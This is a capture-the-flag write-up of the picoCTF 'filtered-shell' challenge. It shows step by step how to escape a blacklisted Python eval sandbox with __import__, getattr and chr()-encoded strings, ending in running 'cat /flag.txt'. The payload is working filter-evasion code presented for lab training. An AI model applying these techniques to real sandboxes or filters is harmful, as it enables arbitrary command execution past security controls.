# 🧠 Filter Bypass in Python Sandbox (picoCTF: filtered-shell)

**Author:** picoCTF Team  
**Category:** Reverse Engineering / Python  
**Difficulty:** 🟠 Medium  
**Tags:** `Python`, `Filter Bypass`, `Subprocess`, `Restricted Execution`, `picoCTF`

---

## 📘 Description

> You're given access to a restricted Python shell with filters on keywords, functions, and arguments. Can you still run commands to read the flag?

---

## 🚀 Challenge Deployment

- 🌐 URL: [picoCTF: filtered-shell](https://play.picoctf.org/practice/challenge/484?category=1&difficulty=2&page=1)  
- 🎯 Goal: Execute OS command despite blacklists on `import`, `os`, `subprocess`, and command strings

---

## 🔥 Vulnerability: Insecure Sandbox Filter

The server evaluates Python input but uses naïve blacklist filtering:
- Direct keywords like `import`, `os`, `cat`, `/flag.txt` are **blocked**
- Function calls and even arguments are inspected

This opens the door for **obfuscated function chaining and dynamic imports**.

---

## 💣 Exploitation Steps

### Step 1: Bypass `import` using `__import__`

```python
m = __import__('sub' + 'process')
```
✅ This dynamically loads the subprocess module without triggering filters.

### Step 2: Access function without calling it directly
```python

func = getattr(m, 'check_output')
```
✅ Avoids detection of check_output() call.

### Step 3: Obfuscate the command using chr()
```python

cmd = chr(99)+chr(97)+chr(116)  # 'cat'
arg = chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)  # '/flag.txt'
```
✅ Hides "cat" and "/flag.txt" from the filter.

### Step 4: Execute the payload
```python
func([cmd, arg])
```
📥 Output:

```
picoCTF{sst1_f1lt3r...}
```

| Property        | Impact                                        |
| --------------- | --------------------------------------------- |
| Confidentiality | 🔴 Full flag disclosure (sensitive data leak) |
| Integrity       | 🔴 Arbitrary command execution possible       |
| Availability    | 🟡 Could lead to abuse or resource exhaustion |

